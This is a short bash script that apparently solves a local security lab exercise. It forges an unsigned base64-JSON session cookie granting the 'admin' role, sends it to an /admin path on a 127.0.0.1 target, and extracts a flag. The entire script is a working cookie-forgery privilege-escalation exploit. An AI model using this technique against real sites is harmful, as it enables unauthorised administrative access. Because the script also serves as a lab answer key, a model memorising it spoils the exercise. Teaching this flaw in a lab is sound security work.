#!/usr/bin/env bash
# Lab 03 — the session cookie is base64 JSON with no signature. Mint your own.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9030}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab03

open_lab "$SESSION" "$URL/login"

FORGED="$(python3 -c '
import base64, json
print(base64.urlsafe_b64encode(json.dumps(
    {"user": "guest", "role": "admin", "tenant": "acme"}).encode()).decode().rstrip("="))')"

send "$SESSION" "$REQ0" --create --set path=/admin --set "cookie.session=$FORGED" | flag
